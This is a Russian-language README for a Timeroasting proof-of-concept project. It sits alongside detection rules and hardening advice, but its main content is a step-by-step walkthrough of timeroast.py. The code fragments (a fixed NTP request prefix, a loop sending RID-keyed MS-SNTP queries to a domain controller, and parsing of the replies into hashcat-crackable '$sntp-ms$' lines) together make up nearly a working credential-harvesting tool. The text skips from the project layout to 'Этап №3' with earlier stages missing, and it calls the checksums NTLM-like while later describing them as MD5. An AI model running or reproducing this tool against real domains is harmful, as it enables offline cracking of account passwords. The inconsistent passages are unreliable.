# Timeroasting

## Краткое описание техники:

**Timeroasting (CVE-2023-31384)** — техника атаки на службу **Windows Time Service (W32Time)**, при которой злоумышленник отправляет специально сформированный NTP-запрос контроллеру домена и получает от службы времени NTLM-аутентификационные данные, которые могут быть использованы для **offline brute-force** восстановления пароля учётной записи компьютера контроллера домена (`DC01$`). Суть уязвимости заключается в том, что W32Time при обработке отдельных типов NTP-пакетов обращается к LSA для вычисления криптографического контрола, что приводит к генерации NTLMv2-подобного ответа, связанного с паролем machine-аккаунта DC.

Полученный хеш перебирается офлайн (hashcat `-m 28500` / John the Ripper). Успех атаки напрямую зависит от давности ротации пароля учётной записи машины DC: чем дольше пароль не менялся, тем больше времени у атакующего на подбор.

## Описание структуры проекта:

* Файл `timeroast.py` содержит реализацию PoC-инструмента для моделирования атаки Timeroasting в лабораторной среде. Инструмент отправляет на контроллер домена NTP-пакет с флагом **Mode 3 (Client Request)** и расширенным полем `KeyID`, после чего перехватывает NTLM-ответ W32Time и сохраняет его в формате, пригодном для последующего offline-перебора (`hashcat -m 28500`).

* Файл `preparation.txt` содержит команды и инструкции по подготовке стенда, настройке службы W32Time и проверкам корректности получения хеша перед разработкой детектов.

* Каталог `detection_rule` содержит правила обнаружения:
  * `suricata_rules/` — сетевые правила Suricata, детектирующие аномальные NTP-пакеты (Mode 3 + расширенные extension-поля, содержащие сигнатуру `NTLMSSP`, характерные для timeroast);
  * `sigma_rules/` — Sigma-правила по событиям Windows Security, Microsoft-Windows-Time-Service и Sysmon;
  * `elk_rules/` — запросы/правила для Elastic (KQL/EQL);
  * `XP_rule_(eXtraction and Processing)/` — нормализационные и корреляционные правила для MaxPatrol SIEM.

* Каталог `triage` хранит артефакты, собранные в ходе эксплуатации: сетевые дампы `.pcapng`, логи Suircata

В заголовке первого NTP-пакета необходимо обратить внимание на следующие параметры:

- Leap Indicator: 3 — часы не синхронизированы либо состояние синхронизации неизвестно.
- Version: 3 — используется третья версия NTP.
- Mode: 3 — Client, клиентский запрос.
- Destination Port: 123 — стандартный порт NTP.

Особое внимание необходимо уделить последним 20 байтам UDP-полезной нагрузки, которые в данном случае содержат данные аутентификации MS-SNTP.
В частности, первые четыре байта этого блока представляют собой Key ID: `01 00 00 00`. В последующих запросах это значение последовательно изменяется. В рассматриваемом захвате Key ID увеличивается от 1 до 5225. В контексте Timeroasting Key ID используется для указания RID (Relative Identifier) учетной записи Active Directory. Таким образом, злоумышленник последовательно проверяет различные идентификаторы учетных записей, пытаясь получить ответы службы времени, содержащие криптографические данные.

### Этап №3. Ответ контроллера домена на запрос MS-SNTP. Пакет №1003

<img width="1919" height="880" alt="53fd7b8c-9a9c-4b31-8484-876a51eb3315" src="https://github.com/user-attachments/assets/9f1c2a9c-ad73-4013-a917-d7f8551295c2" />

В пакете №1003 наблюдается ответ от 192.168.0.10 к 192.168.0.30. Здесь важно обратить внимание на то, что Key ID в ответе совпадает с Key ID предыдущего запроса (пакет №1002). После стандартного 48-байтового заголовка NTP располагаются дополнительные 20 байт:

- 4 байта — Key ID: содержит RID учетной записи Active Directory
- 16 байт — Crypto-Checksum: криптографическая контрольная сумма, вычисленная на основе NT-хеша пароля учетной записи и первых 48 байт NTP-пакета.

В рассматриваемом пакете №1003 поле Key ID имеет значение `EA 03 00 00`, что соответствует RID 1002. Следующие 16 байт содержат контрольную сумму: `7a087a4e19212f54f915e19e97fb2d7e`

Особенность данного механизма заключается в том, что контроллер домена формирует Crypto-Checksum с использованием NT-хеша пароля соответствующей учетной записи Active Directory и первых 48 байт NTP-ответа. Полученная контрольная сумма передается клиенту в открытом виде в составе сетевого пакета, при этом сам NT-хеш пароля не передается.

Злоумышленник берет предполагаемый пароль, вычисляет его NT-хеш с помощью MD4, после чего использует полученный хеш совместно с сохраненными данными NTP-ответа для повторного вычисления Crypto-Checksum. Если рассчитанное значение совпадает с перехваченным, значит, проверяемый пароль соответствует секрету учетной записи.

## Защита от Timeroasting (без СЗИ, аудитом и настройками DC)

### 1. Аудит учетных записей Active Directory

Необходимо проверить состояние доменных учетных записей компьютеров: 

- Выявить неактивные и устаревшие учетные записи компьютеров, которые больше не используются в инфраструктуре.
- Проверить учетные записи, для которых применяются вручную заданные или нестандартные пароли.
- Убедиться, что пароли машинных учетных записей автоматически меняются и не используются длительное время без ротации.

### 2. Ограничение доступа к службе NTP

Необходимо ограничить доступ к UDP/123 на контроллере домена с помощью встроенного Windows Firewall или сетевых ACL.

- Разрешить NTP-запросы только от доверенных узлов и сетевых сегментов, которым необходима синхронизация времени с контроллером домена.
- Исключить доступ к UDP/123 из недоверенных и гостевых сетей.

### 3. Проверка параметра RequireSecureTimeSyncRequests

В ряде публикаций в качестве одной из мер защиты от Timeroasting упоминается настройка параметра `RequireSecureTimeSyncRequests`. Однако в ходе практического тестирования было установлено, что даже после применения данной настройки атака продолжала успешно выполняться. Таким образом, изменение этого параметра само по себе не обеспечивает защиту от Timeroasting и не предотвращает получение криптографических контрольных сумм, необходимых для последующего офлайн-подбора паролей.

Пример применяемой конфигурации:

```powershell

$path = "HKLM:\SYSTEM\CurrentControlSet\Services\W32Time\Config"

Set-ItemProperty -Path $path `
    -Name RequireSecureTimeSyncRequests `
    -Type DWord `
    -Value 1

Restart-Service W32Time
```


## Описание Python-скрипта для проведения Timeroasting

В описании приведены основные фрагменты функций, реализующих механику атаки Timeroasting. Полный функционал представлен в исходном коде.

Скрипт предназначен для автоматизированного получения криптографических контрольных сумм (Crypto-Checksum) с контроллера домена посредством протокола MS-SNTP. Основной принцип его работы заключается в последовательной отправке NTP-запросов с различными значениями RID (Relative Identifier) и обработке ответных пакетов от контроллера домена. Полученные данные преобразуются в формат, совместимый с Hashcat, что позволяет использовать их для последующего офлайн-подбора паролей учетных записей.

### 1. Импорт библиотек и определение параметров

В начале программы импортируются стандартные библиотеки Python, необходимые для формирования сетевых пакетов, организации UDP-соединения, обработки бинарных данных и управления параметрами командной строки:

```python
from binascii import hexlify, unhexlify

```

Основное назначение используемых библиотек:

- `socket` — создание UDP-сокета и отправка NTP-запросов на контроллер домена.
- `select` — ожидание поступления ответных пакетов без блокировки выполнения программы на неопределенное время.
- `struct` — преобразование числовых значений в бинарное представление и извлечение данных из полученных пакетов.

Далее определяются константы, отвечающие за формирование NTP-запросов и параметры выполнения программы:

```python
NTP_PREFIX = unhexlify(
    'db0011e9000000000001000000000000e1b8407debc7e50600000000000000000000000000000000e1b8428bffbfcd0a'
)

DEFAULT_RATE = 180
DEFAULT_GIVEUP_TIME = 24
```

Константа `NTP_PREFIX` содержит заранее подготовленную бинарную последовательность, представляющую собой начальную часть NTP-запроса с MD5-аутентификатором. Она используется как неизменяемая основа для формирования последующих запросов. К ней добавляются значение RID и 16 байт фиктивной контрольной суммы.

Параметр `DEFAULT_RATE` определяет стандартную частоту отправки запросов и составляет 180 пакетов в секунду. `DEFAULT_GIVEUP_TIME` задает период ожидания новых ответов, равный 24 секундам. Если за это время корректные ответы не поступают, программа завершает процесс сбора данных.

### 2. Формирование диапазона идентификаторов RID

Выбор идентификаторов учетных записей реализован через функцию `num_ranges`, которая обрабатывает переданные пользователем значения и преобразует их в последовательность RID:

```python
def num_ranges(arg):
    try:
        ranges = []
        for part in arg.split(','):
            if '-' in part:
                [start, end] = part.split('-')
                assert 0 <= int(start) < int(end) < 2**31
                ranges.append(range(int(start), int(end) + 1))
            else:
                assert 0 <= int(part) < 2**31
                ranges.append([int(part)])

        return chain(*ranges)
    except:
        raise ArgumentTypeError(f'Invalid number ranges: "{arg}".')
```

Функция принимает строковый аргумент, содержащий отдельные значения RID или диапазоны, разделенные запятыми. Если переданное значение содержит символ `-`, программа интерпретирует его как диапазон идентификаторов. В противном случае значение рассматривается как отдельный RID.

Для формирования последовательности используется `range`, а для объединения полученных диапазонов — `chain`. Благодаря этому программа может последовательно обрабатывать несколько диапазонов без необходимости предварительно создавать единый список всех идентификаторов в памяти.

Дополнительно выполняется проверка допустимых значений: RID должен быть неотрицательным и находиться в пределах, не превышающих `2^31 - 1`. Это связано с использованием старшего бита 32-битного поля Key Identifier для определения версии пароля.

Если пользователь не указывает собственный диапазон, используется значение по умолчанию:

```python
default=range(1, 2**31)
```

Таким образом, программа получает возможность последовательно перебирать значения RID начиная с 1.

### 3. Формирование строки для Hashcat

Функция `hashcat_format` отвечает за преобразование полученных криптографических данных в формат, совместимый с Hashcat:

```python
def hashcat_format(rid: int, hashval: bytes, salt: bytes) -> str:
    """Encodes hash in Hashcat-compatible format (with username prefix)."""
    return f'{rid}:$sntp-ms${hexlify(hashval).decode()}${hexlify(salt).decode()}'
```

В качестве входных аргументов функция получает:

- `rid` — идентификатор учетной записи, связанный с полученной контрольной суммой.
- `hashval` — бинарное значение Crypto-Checksum.
- `salt` — первые 48 байт NTP-ответа, используемые при проверке кандидатов пароля.

Функция преобразует бинарные значения `hashval` и `salt` в шестнадцатеричное представление с помощью `hexlify`. После этого формируется строка следующего вида:

```text
<RID>:$sntp-ms$<Crypto-Checksum>$<Salt>
```

Префикс `$sntp-ms$` указывает на тип используемого формата, а RID выступает в качестве имени пользователя. Такой подход позволяет сохранить связь между полученной контрольной суммой и идентификатором учетной записи Active Directory.

### 4. Основная функция сбора данных ntp_roast

Основная логика работы скрипта сосредоточена в функции `ntp_roast`. Она отвечает за организацию сетевого взаимодействия с контроллером домена, последовательную отправку NTP-запросов, получение ответов и извлечение криптографических данных.

```python
def ntp_roast(
    dc_host: str,
    rids: Iterable,
    rate: int,
    giveup_time: float,
    old_pwd: bool,
    src_port: int = 0
) -> List[Tuple[int, bytes, bytes]]:
```

Функция принимает следующие параметры:

- `dc_host` — IP-адрес или имя контроллера домена, выступающего в роли NTP-сервера.
- `rids` — последовательность идентификаторов учетных записей, для которых будут формироваться запросы.
- `rate` — частота отправки NTP-запросов в секунду.
- `giveup_time` — время ожидания новых корректных ответов.
- `old_pwd` — логический параметр, определяющий использование предыдущего пароля учетной записи вместо текущего.
- `src_port` — исходный UDP-порт, используемый при отправке запросов.

Результатом выполнения функции являются кортежи, содержащие RID, Crypto-Checksum и соль.

### 4.1. Определение версии пароля

В начале функции определяется значение `keyflag`, которое используется при формировании Key Identifier:

```python
keyflag = 2**31 if old_pwd else 0
```

Поле Key Identifier имеет размер 4 байта. В используемом механизме младшие 31 бит содержат RID учетной записи, а старший бит применяется как флаг выбора версии пароля.

Если параметр `old_pwd` имеет значение `True`, устанавливается старший бит. В противном случае он остается равным нулю.

Таким образом, программа поддерживает получение контрольных сумм, связанных как с текущим, так и с предыдущим паролем учетной записи компьютера. Это позволяет расширить набор потенциально доступных для проверки значений.

### 4.2. Создание UDP-сокета

Для взаимодействия с контроллером домена используется UDP-сокет:

```python
with socket(AF_INET, SOCK_DGRAM) as sock:
    try:
        sock.bind(('0.0.0.0', src_port))
    except PermissionError:
        raise PermissionError(
            f'No permission to listen on port {src_port}. May need to run as root.'
        )
```

Параметр `AF_INET` указывает на использование IPv4, а `SOCK_DGRAM` определяет тип сокета как UDP.

Метод `bind` привязывает сокет ко всем доступным сетевым интерфейсам (`0.0.0.0`) и указанному исходному порту. Если значение `src_port` равно нулю, операционная система самостоятельно выбирает свободный динамический порт.

В случае ошибки доступа к указанному порту программа генерирует исключение `PermissionError` с соответствующим сообщением.

Использование UDP обусловлено тем, что NTP работает поверх данного транспортного протокола и использует порт 123 на стороне сервера.

### 4.3. Расчет интервала отправки запросов

После создания сокета программа рассчитывает временной интервал между отправляемыми запросами:

```python
query_interval = 1 / rate
last_ok_time = time()
rids_received = set()
rid_iterator = iter(rids)
```

Переменная `query_interval` определяет промежуток времени между отправками пакетов. При стандартном значении `rate = 180` интервал составляет приблизительно 5,56 миллисекунды.

Переменная `last_ok_time` сохраняет время последнего успешно обработанного ответа. Она используется для определения момента завершения сбора данных.

Множество `rids_received` предназначено для хранения уже обработанных идентификаторов RID и предотвращения повторного добавления одинаковых результатов.

Переменная `rid_iterator` создает итератор для последовательного получения значений из переданного диапазона RID.

### 4.4. Формирование и отправка NTP-запроса

Основной цикл отправки запросов реализован следующим образом:

```python
while time() < last_ok_time + giveup_time:

    query_rid = next(rid_iterator, None)
    if query_rid is not None:
        query = NTP_PREFIX + pack('<I', query_rid ^ keyflag) + b'\x00' * 16
        sock.sendto(query, (dc_host, 123))
```

Цикл продолжает выполняться до тех пор, пока с момента последнего корректного ответа не истечет установленное время ожидания.

На каждой итерации программа получает следующий RID из последовательности. Если идентификаторы еще не закончились, формируется NTP-запрос.

Для этого используется операция конкатенации трех бинарных последовательностей:

1. `NTP_PREFIX` — заранее подготовленная начальная часть NTP-пакета.
2. `pack('<I', query_rid ^ keyflag)` — четырехбайтовое значение Key Identifier, сформированное с учетом выбранной версии пароля.
3. `b'\x00' * 16` — 16 байт фиктивной контрольной суммы, добавляемой в конец запроса.

Функция `pack('<I', ...)` преобразует числовое значение в четырехбайтовую последовательность с порядком байтов Little Endian. Оператор `^` выполняет побитовое XOR между RID и флагом `keyflag`.

После формирования пакет отправляется методом `sendto` на адрес контроллера домена и UDP-порт 123.

Таким образом, для каждого значения RID создается отдельный NTP-запрос, позволяющий проверить реакцию контроллера домена на соответствующий идентификатор.

### 4.5. Ожидание и получение ответных пакетов

После отправки запроса программа ожидает поступления ответа либо завершения установленного интервала между запросами:

```python
ready, [], [] = select([sock], [], [], query_interval)

if ready:
    reply = sock.recvfrom(120)[0]
```

Функция `select` отслеживает состояние UDP-сокета. Если в течение указанного интервала поступает ответный пакет, сокет становится доступным для чтения.

Далее вызывается `recvfrom(120)`, который получает данные из сокета. Значение `120` определяет максимальный размер принимаемого пакета в байтах. Из возвращаемого результата извлекается непосредственно содержимое пакета.

Применение `select` позволяет программе совмещать отправку запросов и обработку ответов, не ожидая каждый ответ отдельно перед отправкой следующего запроса.

### 4.6. Проверка структуры полученного NTP-ответа

После получения пакета выполняется проверка его длины:

```python
if len(reply) == 68:
    salt = reply[:48]
    answer_rid = unpack('<I', reply[-20:-16])[0] ^ keyflag
    md5hash = reply[-16:]
```

В рассматриваемой реализации обрабатываются только ответы размером 68 байт. Такая длина соответствует классическому варианту NTP-пакета с 48-байтовым заголовком и 20-байтовым блоком аутентификации.

Из полученного ответа извлекаются три составляющие:

**1. Salt**

```python
salt = reply[:48]
```

Сохраняются первые 48 байт NTP-ответа. Они содержат данные NTP-пакета, которые в дальнейшем используются при проверке кандидатов пароля.

**2. Key Identifier**

```python
answer_rid = unpack('<I', reply[-20:-16])[0] ^ keyflag
```

Извлекаются четыре байта, расположенные перед последними 16 байтами пакета. Они интерпретируются как поле Key Identifier в порядке Little Endian.

После преобразования выполняется операция XOR с `keyflag`, позволяющая получить значение RID без установленного флага выбора предыдущего пароля.

**3. Crypto-Checksum**

```python
md5hash = reply[-16:]
```

Последние 16 байт ответа сохраняются в переменной `md5hash`. Они представляют собой криптографическую контрольную сумму, используемую при последующей проверке кандидатов пароля.

Таким образом, из одного корректного NTP-ответа программа извлекает данные, необходимые для формирования записи в формате Hashcat.

### 4.7. Фильтрация повторных ответов

После извлечения необходимых значений программа проверяет, обрабатывался ли ранее полученный RID:

```python
if answer_rid not in rids_received:
    rids_received.add(answer_rid)
    yield (answer_rid, md5hash, salt)

last_ok_time = time()
```

Для этого используется множество `rids_received`, которое содержит идентификаторы уже обработанных ответов.

Если RID отсутствует в множестве, он добавляется в него, а функция возвращает кортеж из трех значений: идентификатора учетной записи, Crypto-Checksum и соли.

Ключевое слово `yield` используется для последовательной передачи результатов вызывающей функции без необходимости предварительно накапливать их все в отдельном списке.

После получения корректного ответа обновляется значение `last_ok_time`. Благодаря этому отсчет времени ожидания начинается заново при поступлении каждого корректного NTP-пакета.

Следует учитывать, что в данной реализации проверяется только уникальность RID, а не соответствие полученного ответа конкретному отправленному запросу. Кроме того, функция извлекает содержимое ответа, но не проверяет адрес отправителя, возвращаемый `recvfrom`.

### 5. Обработка параметров командной строки

Настройка параметров выполнения программы реализована в функции `get_args` с использованием библиотеки `argparse`.

```python
def get_args():
    argparser = ArgumentParser(
        formatter_class=RawDescriptionHelpFormatter,
        description=...
    )
```

Функция создает парсер аргументов и определяет доступные пользователю параметры. Это позволяет изменять поведение программы без необходимости редактирования исходного кода.

Основные параметры:

| Параметр | Назначение |
|---|---|
| `-o`, `--out` | Определяет файл для сохранения полученных данных. Если параметр не указан, результаты выводятся в стандартный поток `stdout`. |
| `-r`, `--rids` | Задает список или диапазон RID для обработки. При отсутствии параметра используется диапазон от 1 до `2^31 - 1`. |
| `-a`, `--rate` | Определяет частоту отправки NTP-запросов. Значение по умолчанию — 180 запросов в секунду. |

Особое внимание следует уделить параметру `--rids`, поскольку он определяет набор идентификаторов, которые будут использоваться при формировании NTP-запросов.

В описании параметров программы также указывается возможность использования исходного порта 123. Это предусмотрено для случаев, когда сетевые правила ограничивают отправку или получение UDP-пакетов с других портов.

### 6. Основной сценарий выполнения программы

Запуск основных операций реализован в функции `main`:

```python
def main():

    args = get_args()
    output = args.out

    for rid, hashval, salt in ntp_roast(
        args.dc,
        args.rids,
        args.rate,
        args.timeout,
        args.old_hashes,
        args.src_port
    ):
        print(hashcat_format(rid, hashval, salt), file=output)
```

На первом этапе функция получает параметры командной строки посредством вызова `get_args`. Далее определяется поток вывода, в который будут записываться результаты.

После этого запускается `ntp_roast`, которой передаются адрес контроллера домена, диапазон RID, частота отправки запросов, время ожидания, параметр выбора версии пароля и исходный UDP-порт.

По мере получения ответов функция `ntp_roast` передает извлеченные данные в основной цикл через `yield`. Для каждого полученного кортежа вызывается `hashcat_format`, преобразующая значения в необходимый формат.

Завершающим действием является запись сформированной строки в выходной поток с помощью `print`.

В конце программы находится стандартная конструкция:

```python
if __name__ == '__main__':
    main()
```

Она обеспечивает запуск функции `main` только в случае непосредственного выполнения данного Python-файла, а не при его импорте в другой программный модуль.

### 7. Общая последовательность работы скрипта

На основании рассмотренных функций можно выделить следующую последовательность выполнения программы:

1. Получение параметров командной строки и определение адреса контроллера домена.
2. Формирование последовательности RID, которые будут использоваться при создании запросов.
3. Создание UDP-сокета и его привязка к указанному исходному порту.
4. Формирование NTP-запросов на основе статической последовательности `NTP_PREFIX`, значения RID и фиктивной контрольной суммы.
5. Последовательная отправка запросов на UDP-порт 123 контроллера домена с заданной частотой.
6. Ожидание поступления ответных пакетов и проверка их размера.
7. Извлечение из ответов Key Identifier, Crypto-Checksum и первых 48 байт NTP-пакета.
8. Фильтрация повторных результатов по RID.
9. Преобразование полученных данных в формат Hashcat и сохранение в выходной файл.
10. Завершение работы при отсутствии новых корректных ответов в течение установленного интервала.

### 8. Особенности реализации и ограничения

В ходе анализа исходного кода можно выделить несколько особенностей, влияющих на процесс сбора данных.

**Обработка только пакетов длиной 68 байт.** Скрипт принимает в качестве корректных только NTP-ответы указанного размера. Ответы с другой структурой или длиной не обрабатываются. Следовательно, реализация ориентирована на конкретный вариант MS-SNTP с классическим блоком аутентификации.

**Ограничение времени ожидания.** Программа завершает сбор после истечения `giveup_time` с момента последнего корректного ответа. При этом отсутствие ответов не означает, что все возможные RID были проверены: причиной могут быть несуществующие учетные записи, сетевые ограничения или потеря пакетов.

**Фильтрация результатов по RID.** Повторные ответы с одинаковым идентификатором не сохраняются. Это позволяет исключить дублирование результатов в выходном файле.

**Отсутствие проверки существования учетных записей в Active Directory.** Скрипт не выполняет LDAP-запросы и не обращается к Active Directory для определения соответствия RID конкретным объектам. Он работает непосредственно с ответами NTP-сервера.

**Отсутствие проверки отправителя ответа.** При получении пакета используется только его содержимое. Возвращаемый `recvfrom` адрес отправителя не анализируется, поэтому в коде отсутствует дополнительная проверка того, что ответ поступил именно от указанного контроллера домена.

**Последовательная отправка запросов и обработка ответов.** Несмотря на использование `select`, в реализации не создаются отдельные потоки или асинхронные задачи. Отправка очередного запроса и проверка доступности сокета выполняются в рамках одного цикла.
